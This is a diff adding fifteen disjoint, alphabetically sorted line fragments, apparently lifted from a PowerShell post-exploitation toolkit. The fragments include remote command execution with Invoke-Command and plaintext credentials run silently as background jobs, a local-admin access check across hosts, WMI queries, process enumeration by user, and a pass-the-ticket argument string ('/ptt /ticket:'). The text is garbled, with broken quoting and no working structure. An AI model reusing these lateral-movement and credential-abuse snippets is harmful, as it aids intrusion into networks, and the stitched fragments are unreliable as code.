@@ -1,0 +1,15 @@
+"UserName $userdefusername -Password $userdefpassword;`$computersLine = `$Find -split [Environment]::NewLine | Where-Object { `$_.contains('.') };if(`$computersLine){`$Find;`$SecPassword = ConvertTo-SecureString $userdefpassword -AsPlainText -Force;`$cred = New-Object System.Management.Automation.PSCredential($userdefusername,`$SecPassword);Invoke-Command -ComputerName `$computersLine -ScriptBlock {$finalstring} -ErrorAction SilentlyContinue -AsJob -Credential `$cred > `$null}else{Write-Output '[-] No Access'}#"")"
+"UserName -AND $Password){$classExists = Get-WmiObject -Class $ClassID -ComputerName $ComputerName -List -Namespace ""root\cimv2"" -Credential $cred}"
+"UserName has Local Admin access on:"""
+"UserName | Select ID, ProcessName, SessionId, UserName, Path | Sort ProcessName | ft -Autosize | Out-String -Width 4096;Write-Output ""[+] Processes sorted by Username:"";Get-Process -IncludeUserName | Select ID, ProcessName, SessionId, UserName, Path | Sort UserName,ProcessName | ft -Autosize | Out-String -Width 4096;if($Isx64){Write-Output ""[+] Current Process [x64]:""}else{Write-Output ""[+] Current Process [x86]:""};Get-Process -IncludeUserName | Where-Object { $_.Id -eq $PID } | Select ID, ProcessName, SessionId, UserName, Path | Sort ID | Format-Table -AutoSize | Out-String -Width 4096}else{Write-Output """";Write-Output ""[+] Processes sorted by PID:"";Get-Process | Select ID, ProcessName, SessionId, Path | Sort ID | ft -Autosize | Out-String -Width 4096;if($Isx64){Write-Output ""[+] Current Process [x64]:""}else{Write-Output ""[+] Current Process [x86]:""};Get-Process | Where-Object { $_.Id -eq $PID } | Select ID, ProcessName, SessionId, Path | Format-Table -AutoSize | Out-String -Width 4096}#'"
+"UserName"", [System.StringComparison]::CurrentCultureIgnoreCase)"
+"UsernameGrab += ""$line`n"""
+"UsernameGrab = """""
+"UsernameGrab = $TempUsernameGrab | Where-Object { $_ -ne """" }"
+"UsernameGrab = ($TempUsernameGrab | Out-String) -split ""`n"""
+"username = """""
+"username: /password:fakepass /ptt /ticket:'"""
+Username = $UserName
+UsernameGrab += $line
+UsernameGrab = $TempUsernameGrab.Trim()
+username = $commandParts[$index + 1]
